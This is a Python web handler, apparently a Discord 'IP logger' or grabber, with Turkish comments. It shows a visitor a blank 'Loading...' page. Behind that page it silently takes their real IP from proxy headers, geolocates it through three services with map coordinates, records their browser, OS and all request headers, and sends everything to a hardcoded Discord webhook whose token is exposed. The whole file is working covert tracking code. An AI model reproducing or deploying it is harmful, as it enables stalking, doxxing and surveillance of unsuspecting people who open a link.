from http.server import BaseHTTPRequestHandler
import requests
import httpagentparser
import json
import socket
import struct
import time
from datetime import datetime

# --- KONFİGÜRASYON ---
config = {
    "webhook": "https://discord.com/api/webhooks/1458566674302238923/0EPCSiG8KU6QcDoFcT0Ugc6BN_fGX_7K6KsXtflSlkKV4ZPH9zSHx3bnirPb0bWDowEk",  # Discord webhook URL'i
    "username": "🛡️ ANTI-CLOUDFLARE LOGGER",
    "color": 0xFF0000  # Kırmızı
}

class handler(BaseHTTPRequestHandler):
    def get_real_ip(self):
        """Cloudflare'ı bypass et - gerçek IP'yi bul"""
        
        # 1. Cloudflare'in gönderdiği header (EN ÖNEMLİ)
        cf_ip = self.headers.get('CF-Connecting-IP')
        if cf_ip:
            print(f"✅ Cloudflare IP: {cf_ip}")
            return cf_ip.split(',')[0].strip()
        
        # 2. X-Forwarded-For (genel proxy)
        x_forwarded = self.headers.get('X-Forwarded-For')
        if x_forwarded:
            print(f"✅ X-Forwarded-For: {x_forwarded}")
            return x_forwarded.split(',')[0].strip()
        
        # 3. X-Real-IP (nginx)
        x_real_ip = self.headers.get('X-Real-IP')
        if x_real_ip:
            print(f"✅ X-Real-IP: {x_real_ip}")
            return x_real_ip.split(',')[0].strip()
        
        # 4. True-Client-IP (Cloudflare Enterprise)
        true_client = self.headers.get('True-Client-IP')
        if true_client:
            print(f"✅ True-Client-IP: {true_client}")
            return true_client.split(',')[0].strip()
        
        # 5. Fly-Client-IP (Fly.io)
        fly_ip = self.headers.get('Fly-Client-IP')
        if fly_ip:
            print(f"✅ Fly-Client-IP: {fly_ip}")
            return fly_ip.split(',')[0].strip()
        
        # 6. Fastly-Client-IP (Fastly)
        fastly_ip = self.headers.get('Fastly-Client-IP')
        if fastly_ip:
            print(f"✅ Fastly-Client-IP: {fastly_ip}")
            return fastly_ip.split(',')[0].strip()
        
        # 7. X-Client-IP (Apache)
        client_ip = self.headers.get('X-Client-IP')
        if client_ip:
            print(f"✅ X-Client-IP: {client_ip}")
            return client_ip.split(',')[0].strip()
        
        # 8. X-Cluster-Client-IP (Load balancer)
        cluster_ip = self.headers.get('X-Cluster-Client-IP')
        if cluster_ip:
            print(f"✅ X-Cluster-Client-IP: {cluster_ip}")
            return cluster_ip.split(',')[0].strip()
        
        # 9. REMOTE_ADDR (en temel)
        remote_addr = self.client_address[0]
        print(f"⚠️ Fallback REMOTE_ADDR: {remote_addr}")
        return remote_addr

    def get_location_from_multiple_sources(self, ip):
        """3 farklı kaynaktan lokasyon al - en doğrusunu bul"""
        
        locations = []
        
        # KAYNAK 1: ip-api.com (en hızlı, genelde doğru)
        try:
            response = requests.get(
                f"http://ip-api.com/json/{ip}?fields=16976857", 
                timeout=3
            )
            data = response.json()
            if data.get('status') == 'success':
                locations.append({
                    'source': 'ip-api.com',
                    'city': data.get('city', 'Unknown'),
                    'region': data.get('regionName', 'Unknown'),
                    'country': data.get('country', 'Unknown'),
                    'countryCode': data.get('countryCode', 'Unknown'),
                    'lat': data.get('lat', 0),
                    'lon': data.get('lon', 0),
                    'isp': data.get('isp', 'Unknown'),
                    'org': data.get('org', 'Unknown'),
                    'as': data.get('as', 'Unknown'),
                    'zip': data.get('zip', 'Unknown'),
                    'timezone': data.get('timezone', 'Unknown'),
                    'mobile': data.get('mobile', False),
                    'proxy': data.get('proxy', False),
                    'hosting': data.get('hosting', False)
                })
        except:
            pass
        
        # KAYNAK 2: ipinfo.io (farklı veri)
        try:
            response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=3)
            data = response.json()
            if data.get('loc'):
                lat, lon = data.get('loc', '0,0').split(',')
                locations.append({
                    'source': 'ipinfo.io',
                    'city': data.get('city', 'Unknown'),
                    'region': data.get('region', 'Unknown'),
                    'country': data.get('country', 'Unknown'),
                    'lat': float(lat),
                    'lon': float(lon),
                    'isp': data.get('org', 'Unknown'),
                    'org': data.get('org', 'Unknown'),
                    'zip': data.get('postal', 'Unknown'),
                    'timezone': data.get('timezone', 'Unknown')
                })
        except:
            pass
        
        # KAYNAK 3: ipgeolocation.io (ek doğrulama)
        try:
            response = requests.get(
                f"https://api.ipgeolocation.io/ipgeo?apiKey=demo&ip={ip}&fields=geo",
                timeout=3
            )
            data = response.json()
            if data.get('country_name'):
                locations.append({
                    'source': 'ipgeolocation.io',
                    'city': data.get('city', 'Unknown'),
                    'region': data.get('state_prov', 'Unknown'),
                    'country': data.get('country_name', 'Unknown'),
                    'lat': float(data.get('latitude', 0)),
                    'lon': float(data.get('longitude', 0)),
                    'isp': data.get('isp', 'Unknown'),
                    'zip': data.get('zipcode', 'Unknown'),
                    'timezone': data.get('time_zone', {}).get('name', 'Unknown')
                })
        except:
            pass
        
        return locations

    def find_best_location(self, locations):
        """En doğru lokasyonu bul (coordinate yakınlığına göre)"""
        if not locations:
            return None
        
        if len(locations) == 1:
            return locations[0]
        
        # Ortalama koordinat bul
        avg_lat = sum(l.get('lat', 0) for l in locations) / len(locations)
        avg_lon = sum(l.get('lon', 0) for l in locations) / len(locations)
        
        # Ortalamaya en yakın olanı seç
        best_loc = min(locations, 
                      key=lambda l: abs(l.get('lat', 0) - avg_lat) + abs(l.get('lon', 0) - avg_lon))
        
        return best_loc

    def get_all_headers(self):
        """Tüm header'ları topla (debug için)"""
        headers = {}
        for key, value in self.headers.items():
            headers[key] = value
        return headers

    def do_GET(self):
        try:
            # Tüm header'ları logla (debug)
            all_headers = self.get_all_headers()
            print("📋 HEADERS:")
            for k, v in all_headers.items():
                print(f"  {k}: {v}")
            
            # GERÇEK IP'Yİ BUL (Cloudflare'ı bypass et)
            real_ip = self.get_real_ip()
            print(f"\n🎯 GERÇEK IP: {real_ip}")
            
            ua = self.headers.get('user-agent', 'Unknown')
            
            # Birden çok kaynaktan lokasyon al
            locations = self.get_location_from_multiple_sources(real_ip)
            best_location = self.find_best_location(locations)
            
            if not best_location:
                # Fallback - sadece temel bilgiler
                best_location = {
                    'city': 'Unknown', 'region': 'Unknown', 'country': 'Unknown',
                    'lat': 0, 'lon': 0, 'isp': 'Unknown', 'source': 'none'
                }
            
            # Google Maps linki
            maps_link = f"https://www.google.com/maps?q={best_location.get('lat', 0)},{best_location.get('lon', 0)}"
            
            # Bot kontrolü
            is_bot = any(b in ua for b in ["Discordbot", "TelegramBot", "Twitterbot", "Slackbot", "Cloudflare"])
            
            os_info, br_info = httpagentparser.simple_detect(ua)
            
            # Embed oluştur
            embed = self.create_embed(real_ip, best_location, maps_link, all_headers, 
                                     ua, os_info, br_info, is_bot, locations)
            
            # Webhook'a gönder
            self.send_to_webhook(embed)
            
            # Boş sayfa gönder (kullanıcı hiçbir şey görmez)
            self.send_empty_page()
            
        except Exception as e:
            print(f"❌ HATA: {e}")
            import traceback
            traceback.print_exc()
            self.send_empty_page()

    def create_embed(self, ip, location, maps_link, headers, ua, os_info, br_info, is_bot, all_locations):
        """Discord embed oluştur"""
        
        # Header'dan Cloudflare bilgilerini çek
        cf_ip = headers.get('cf-connecting-ip', 'N/A')
        cf_ray = headers.get('cf-ray', 'N/A')
        cf_country = headers.get('cf-ipcountry', 'N/A')
        
        # Konum doğruluk kontrolü
        accuracy = "🎯 YÜKSEK (Multiple sources)" if len(all_locations) > 1 else "⚠️ DÜŞÜK (Single source)"
        
        description = f"""**🔍 ANTI-CLOUDFLARE BYPASS AKTİF!**

**📡 IP INFORMATION:**
> **Gerçek IP:** `{ip}`
> **Cloudflare IP:** `{headers.get('x-forwarded-for', 'N/A')}`
> **CF-Connecting-IP:** `{cf_ip}`
> **CF-Ray:** `{cf_ray}`
> **CF-Country:** `{cf_country}`

**📍 KONUM BİLGİSİ:**
> **Ülke:** `{location.get('country', 'N/A')} ({location.get('countryCode', 'N/A')})`
> **Şehir/Bölge:** `{location.get('city', 'N/A')}, {location.get('region', 'N/A')}`
> **Posta Kodu:** `{location.get('zip', 'N/A')}`
> **Koordinatlar:** `{location.get('lat', 0)}, {location.get('lon', 0)}`
> **Google Maps:** [Tıkla]({maps_link})
> **Doğruluk:** `{accuracy}`

**🌐 KAYNAK SERVİSLER:**
"""
        
        for i, loc in enumerate(all_locations):
            description += f"> **Kaynak {i+1} ({loc.get('source', 'N/A')}):** `{loc.get('city', 'N/A')}, {loc.get('country', 'N/A')}`\n"
        
        description += f"""
**🔌 BAĞLANTI:**
> **ISP:** `{location.get('isp', 'N/A')}`
> **Organizasyon:** `{location.get('org', 'N/A')}`
> **ASN:** `{location.get('as', 'N/A')}`
> **Mobile:** `{'Evet' if location.get('mobile') else 'Hayır'}`
> **Proxy/VPN:** `{'Evet' if location.get('proxy') else 'Hayır'}`
> **Hosting:** `{'Evet' if location.get('hosting') else 'Hayır'}`

**💻 SİSTEM:**
> **OS:** `{os_info}`
> **Browser:** `{br_info}`
> **Bot mu?** `{'Evet' if is_bot else 'Hayır'}`

**📋 TÜM HEADER'LAR:**
```json
{json.dumps(dict(headers), indent=2)[:500]}...
```"""
        
        return {
            "username": config["username"],
            "embeds": [{
                "title": "🛡️ ANTI-CLOUDFLARE - GERÇEK IP YAKALANDI!",
                "color": config["color"],
                "description": description,
                "footer": {"text": f"Cloudflare Bypass v2.0 | {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"}
            }]
        }

    def send_to_webhook(self, embed):
        """Discord webhook'a gönder"""
        try:
            response = requests.post(
                config["webhook"],
                json=embed,
                headers={'Content-Type': 'application/json'},
                timeout=5
            )
            if response.status_code == 204:
                print("✅ Webhook başarıyla gönderildi")
            else:
                print(f"⚠️ Webhook hatası: {response.status_code}")
        except Exception as e:
            print(f"❌ Webhook hatası: {e}")

    def send_empty_page(self):
        """Boş sayfa gönder"""
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        
        html = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        body { margin:0; padding:0; background:#f5f5f5; }
    </style>
</head>
<body>
    <!-- Boş sayfa - logger arka planda çalışıyor -->
</body>
</html>"""
        
        self.wfile.write(html.encode('utf-8'))
    
    def log_message(self, format, *args):
        """Console log"""
        print(f"{self.client_address[0]} - {format % args}")

# Local test için
if __name__ == '__main__':
    from http.server import HTTPServer
    server = HTTPServer(('0.0.0.0', 8000), handler)
    print('='*50)
    print('🚀 ANTI-CLOUDFLARE IP LOGGER BAŞLATILDI!')
    print('='*50)
    print('📡 Server: http://localhost:8000')
    print('🔍 Test etmek için tarayıcıdan gir')
    print('⚠️  Webhook URL ayarlamayı unutma!')
    print('='*50)
    server.serve_forever()
